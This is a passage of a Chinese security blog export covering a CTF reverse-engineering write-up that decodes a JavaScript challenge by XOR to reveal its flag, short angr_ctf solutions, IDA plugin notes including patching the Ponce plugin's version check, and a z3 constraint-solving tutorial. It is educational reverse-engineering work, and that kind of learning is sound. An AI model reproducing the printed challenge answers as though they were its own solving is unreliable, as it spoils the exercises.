class="keyword">false</span></span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                              <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;operator&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^&quot;</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;right&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">149</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">152</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;key&quot;</span></span><br><span class="line">                              <span class="punctuation">&#125;</span><span class="comment">//调用了运算符^(异或)对前面的值做右异或(有些运算符可能不满足交换律需要注意计算方向)</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                      <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">163</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">167</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;join&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Literal&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">168</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">170</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></div>

<p>上面的基本代码逻辑就是将每个传进去的字符异或上key并返回异或后的新的字符串</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ExpressionStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">227</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">227</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">192</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">181</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">188</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">189</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">192</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;log&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">193</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">226</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">193</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">195</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bE&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Literal&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">196</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">222</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EXXH_MpjxBxYnjggrM~eerv&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;EXXH_MpjxBxYnjggrM~eerv&#x27;&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Literal&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">223</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">225</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">11</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;11&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>此处基本就是调用之前的函数bE，对参数”EXXH_MpjxBxYnjggrM~eerv”，异或上11，再通过console(类)的log(方法)输出flag</p>
<p>所以此处可以直接通过异或就能得出对应的flag</p>
<p>因为此处其编码无法显示出对应的字符，直接通过二进制编辑器打开，查看其二进制编码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307082149781.png"
                      alt="image-20230708214959751"
                ></p>
<p>exp:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [1]: a=[0x45 ,0x58 ,0x58 ,0x48 ,0x5F ,0x4D ,0x70 ,0x6A ,0x78 ,0x7F,0x42 ,0x78 ,0x59 ,0x6E ,0x6A ,0x67^M</span><br><span class="line">   ...: ,0x67 ,0x72,0x4D ,0x7E,0x65 ,0x65 ,0x72 ,0x76]</span><br><span class="line">   ...: ^M</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [2]: str1=&#x27;&#x27;</span><br><span class="line">   ...: for i in a:</span><br><span class="line">   ...:     str1+=chr(i^11)</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [3]: str1</span><br><span class="line">Out[3]: &#x27;NSSCTF&#123;astIsReallyFunny&#125;&#x27;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>js</category>
        <category>ast</category>
      </categories>
  </entry>
  <entry>
    <title>0</title>
    <url>/2023/12/31/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/angr_ctf/00/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *<span class="comment">#导入angr框架</span></span><br><span class="line">p=Project(<span class="string">&quot;二进制文件&quot;</span>)<span class="comment">#导入二进制文件,第一步一般就是这个</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#状态，entry_state指的是程序刚进行时候的状态(包含寄存器之类的)</span></span><br><span class="line">sm=p.factory.simulation_manager(state)<span class="comment">#模拟状态管理器类似于z3的新建solver(个人理解),内部参数为状态，可以为刚刚的entry_state()</span></span><br><span class="line">sm.explore(find=地址)<span class="comment">#启动简单搜索,具体在下方</span></span><br><span class="line"><span class="comment">#也可以使用lambda添加条件 sm.explore(find=lambda x: &quot;Good&quot; in x.posix.dumps(1)) 这个条件就是Good字符串出现在标准输出中</span></span><br><span class="line">sm.found[<span class="number">0</span>].posix.dump(<span class="number">0</span>)<span class="comment">#获取标准输入</span></span><br></pre></td></tr></table></figure></div>

<p><a class="link"   href="https://www.jianshu.com/p/95dc43d52227" >Simulation Manager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>简单探索(Simple Exploration)</p>
<p>符号执行最普遍的操作是找到能够到达某个地址的状态，同时丢弃其他不能到达这个地址的状态。SM为使用这种执行模式提供了捷径：<code>.explore()</code>方法。当使用<code>find</code>参数启动<code>.explore()</code>方法时，程序将会一直执行，直到发现了一个和<code>find</code>参数指定的条件相匹配的状态。<code>find</code>参数的内容可以是想要执行到的某个地址、或者想要执行到的地址列表、或者一个获取state作为参数并判断这个state是否满足某些条件的函数。当<code>active</code>stash中的任意状态和<code>find</code>中的条件匹配的时候，它们就会被放到<code>found</code>stash中，执行随即停止。之后你可以探索找到的状态，或者决定丢弃它，转而探索其它状态。你还可以按照和<code>find</code>相同的格式设置另一个参数——<code>avoid</code>。当一个状态和<code>avoid</code>中的条件匹配时，它就会被放进<code>avoided</code>stash中，之后继续执行。最后，<code>num_find</code>参数指定函数返回前需要找到的符合条件的状态的个数，这个参数默认是1。当然，如果<code>active</code>stash中已经没有状态可以执行，那么不论有没有找到你指定的状态个数，都会停止执行。</p>
</blockquote>
<h2 id="SimState类"><a href="#SimState类" class="headerlink" title="SimState类"></a><a class="link"   href="https://blog.csdn.net/zhuzhuzhu22/article/details/80408760" >SimState类 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><blockquote>
<p>p.factory.entry_state(),sm.found[0]同属于SimState类 </p>
<p>posix – MISNOMER: 操作系统或者环境模型的表示 (包含stdin(0),stdout(1),stderr(2))</p>
<p>posix.dumps()用于导出posix中的输入输出、错误，参数就是对应的数据标号</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
        <category>angr_ctf</category>
      </categories>
  </entry>
  <entry>
    <title>1</title>
    <url>/2024/01/01/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/angr_ctf/01/</url>
    <content><![CDATA[<p>avoid- 用于提升angr计算速度,避免进入内部</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401210153393.png"
                      alt="image-20240101013027355"
                ></p>
<p>在设置explore参数时增加avoid参数并将参数设置为avoid_me的首地址</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line">p=Project(<span class="string">&quot;./01_angr_avoid&quot;</span>)</span><br><span class="line">state=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simulation_manager(state)</span><br><span class="line">sm.explore(find=<span class="number">0x080492FB</span>,avoid=<span class="number">0x0080492BB</span>)</span><br><span class="line">sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
        <category>angr_ctf</category>
      </categories>
  </entry>
  <entry>
    <title>2</title>
    <url>/2024/01/01/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/angr_ctf/02/</url>
    <content><![CDATA[<p>explore的avoid参数可以用lambda确定find和avoid</p>
<p>find-用于寻找</p>
<p>avoid-用于避免</p>
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line">p=Project(<span class="string">&quot;./02_angr_find_condition&quot;</span>)</span><br><span class="line">state=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simulation_manager(state)</span><br><span class="line">sm.explore(find=<span class="keyword">lambda</span> x: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> x.posix.dumps(<span class="number">1</span>),avoid= <span class="keyword">lambda</span> y: <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> y.posix.dumps(<span class="number">1</span>))<span class="comment">#限定标准输出中有&quot;Good Job.&quot;为需要寻找的，有&quot;Try again.&quot;是需要避免的，avoid用于增加查找速度</span></span><br><span class="line">sm.explore(find=<span class="keyword">lambda</span> x: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> x.posix.dumps(<span class="number">1</span>))<span class="comment">#也可以不加avoid 会慢一点</span></span><br><span class="line">sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
        <category>angr_ctf</category>
      </categories>
  </entry>
  <entry>
    <title>bindiff</title>
    <url>/2024/03/12/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/bindiff/</url>
    <content><![CDATA[<p>可用于导入函数名</p>
<p>比如某程序静态编译了某glibc库，可通过比较对应的glibc来导入对应的函数名 方便进行程序分析</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
        <category>plugins</category>
      </categories>
  </entry>
  <entry>
    <title>go_parser</title>
    <url>/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/go_parser/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/0xjiayu/go_parser" >0xjiayu&#x2F;go_parser：IDAPro 的另一个 Golang 二进制解析器 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
        <category>plugins</category>
      </categories>
  </entry>
  <entry>
    <title>ipyida</title>
    <url>/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/ipyida/</url>
    <content><![CDATA[<p>ida内置ipython</p>
<p><a class="link"   href="https://github.com/eset/ipyida" >eset&#x2F;ipyida: IPython console integration for IDA Pro (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
        <category>plugins</category>
      </categories>
  </entry>
  <entry>
    <title>ponce</title>
    <url>/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/ponce/</url>
    <content><![CDATA[<p>跟angr类似用于符号执行</p>
<p><a class="link"   href="https://github.com/illera88/Ponce" >https://github.com/illera88/Ponce <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>虽然relese中只有8.1版本 但是可以通过逆向<code>Ponce.dll</code>和<code>Ponce64.dll</code></p>
<p>拖入ida后搜索<code>This Ponce plugin</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401291546716.png"
                      alt="image-20240129154636516"
                ></p>
<p>修改其对应的版本即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401291547697.png"
                      alt="image-20240129154759548"
                ></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
        <category>plugins</category>
      </categories>
  </entry>
  <entry>
    <title>qilingida</title>
    <url>/2024/01/29/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/ida/plugins/qilingida/</url>
    <content><![CDATA[<p>qiling ida内置插件</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>ida</category>
        <category>plugins</category>
      </categories>
  </entry>
  <entry>
    <title>pythonz3</title>
    <url>/2023/07/27/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/python/pythonz3/pythonz3/</url>
    <content><![CDATA[<p>官方文档<a class="link"   href="https://z3prover.github.io/api/html/namespacez3py.html?spm=a2c6h.12873639.article-detail.7.5e5c2666btxxry" >Z3: z3py Namespace Reference (z3prover.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="基本变量类型"><a href="#基本变量类型" class="headerlink" title="基本变量类型"></a>基本变量类型</h1><p>其分为整型(Int)，实型(Real)和向量(BitVec)</p>
<p>下面的类构造器中的ctx&#x3D;None(默认的上下文)表示该变量在python全局都起作用，可以直接传给Solver类用于求解,所以一般也不用标明ctx&#x3D;xxx这种的直接调用Int(name)构造器即可</p>
<p>ctx&#x3D;一个context对象,即可创建独立的上下文，这个不太重要，具体可见<a class="link"   href="https://www.cnblogs.com/aomi/p/7353869.html" >python的上下文管理（context）（1） - 很大很老实 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="整形-int"><a href="#整形-int" class="headerlink" title="整形(int)"></a>整形(int)</h2><p>不是c中具有上下限的整形而是数学意义上的整数</p>
<p>创建方式</p>
<ol>
<li>Int(name, ctx&#x3D;None)，创建一个整数变量，name是名字</li>
<li>Ints (names, ctx&#x3D;None)，创建多个整数变量，names是空格分隔名字</li>
<li>IntVal (val, ctx&#x3D;None)，创建一个整数常量，有初始值，没名字。</li>
</ol>
<h2 id="实形-real"><a href="#实形-real" class="headerlink" title="实形(real)"></a>实形(real)</h2><p>是数学意义上的实数</p>
<p>创建方式</p>
<ol>
<li>real(name, ctx&#x3D;None)，创建一个实变量，name是名字</li>
<li>reals (names, ctx&#x3D;None)，创建多个实变量，names是空格分隔名字</li>
<li>realVal (val, ctx&#x3D;None)，创建一个实常量，有初始值，没名字。</li>
</ol>
<h2 id="向量-BitVec"><a href="#向量-BitVec" class="headerlink" title="向量(BitVec)"></a>向量(BitVec)</h2><p>数学意义上的向量</p>
<p>创建方式</p>
<p>Bitvec(name,bv,ctx&#x3D;None)，创建一个位向量，name是他的名字，bv表示大小 <code>比如Bitvec(&#39;x&#39;,8)相当于8位二进制数等效于char型</code><br>BitVecs(name,bv,ctx&#x3D;None)，创建一个有多变量的位向量，name是名字，bv表示大小<br>BitVecVal(val,bv,ctx&#x3D;None)，创建一个位向量，有初始值，没名字。</p>
<p>注意BitVec会根据你所用的位数来进行化简 具体表现为 在条件中自动添加%(2**bit位数)这个条件 来进行条件化简</p>
<h1 id="具体指令"><a href="#具体指令" class="headerlink" title="具体指令"></a>具体指令</h1><ol>
<li>s&#x3D;solver()，创建一个解的对象。</li>
<li>s.add(条件)，为解增加一个限制条件</li>
<li>s.check()，检查解是否存在，如果存在，会返回”sat”</li>
<li>model()，输出解得结果</li>
</ol>
<p>5.<code>solver.assertions()</code>查看求解器已经添加的约束和约束的个数</p>
<p>在计算时需给变量约束，没有约束是计算不出结果的，同时给了约束才能进行计算。</p>
<h1 id="解决一般方程组"><a href="#解决一般方程组" class="headerlink" title="解决一般方程组"></a>解决一般方程组</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">x=z3.Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=z3.Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z3.solve(x&gt;<span class="number">2</span>,y&lt;<span class="number">10</span>,x+<span class="number">2</span>*y==<span class="number">7</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">[y = <span class="number">0</span>, x = <span class="number">7</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#####################################</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*<span class="comment">#直接导入所有类，不用带.访问符</span></span><br><span class="line">x=Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z3.solve(x&gt;<span class="number">2</span>,y&lt;<span class="number">10</span>,x+<span class="number">2</span>*y==<span class="number">7</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">[y = <span class="number">0</span>, x = <span class="number">7</span>]</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="ctf基本用法"><a href="#ctf基本用法" class="headerlink" title="ctf基本用法"></a>ctf基本用法</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">flag=[BitVec(<span class="string">f&quot;flag[<span class="subst">&#123;i&#125;</span>]&quot;</span>,<span class="number">8</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flaglen)]<span class="comment">#flaglen一般为flag的长度,此处使用BitVec位向量方便还原字符的位运算操作， c语言一个字符长度为8bit</span></span><br><span class="line"><span class="comment">#flag=[Int(f&quot;flag[&#123;i&#125;]&quot;)for i in range(flaglen)]</span></span><br><span class="line"><span class="comment">#flag=[Real(f&quot;flag[&#123;i&#125;]&quot;)for i in range(flaglen)]</span></span><br><span class="line">f=Solver()<span class="comment">#创建求解器实例,相当于告诉python你要计算了</span></span><br><span class="line">out=flag<span class="comment">#将对象传给out,用于计算，可能会有某些计算会打乱初始flag的顺序，为了防止更改这种顺序，用out来代替计算</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">添加需要的条件</span></span><br><span class="line"><span class="string">模仿c语言内对flag的操作即可</span></span><br><span class="line"><span class="string">f.add(out[xxx]==xxx)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> f.check()==sat:<span class="comment">#f.check()用于检查是否有解,sat表示有解，此处用循环表现存在多解的情况</span></span><br><span class="line">    condition = []<span class="comment">#用于存放当前的条件</span></span><br><span class="line">    m = f.model()<span class="comment">#存放解的字典,用m[flag[xxx]]来访问，这种字典跟python字典是一个意思,只不过键对应的值是intNumRef类型</span></span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))<span class="comment">#m[flag[i]]获取的是intNumRef类型的值可以通过转化为字符串再转化为数值传给chr转化为字符,也可通过intNumRef的as_long()方法转化为数值 p+=chr(m[flag[i]].as_long())</span></span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))<span class="comment">#存放当前的字符的条件用于寻找多解可改为condition.append(flag[i]!=m[flag[i]].as_long())</span></span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))<span class="comment">#Or用于表现或等效于增加了(flag[0]!=当前的flag[0])的值or(flag[1]!=当前的flag[1]的值),以此类推,要让该条件为真，则下一个求出来的flag值跟上一个flag值至少有一个不同</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
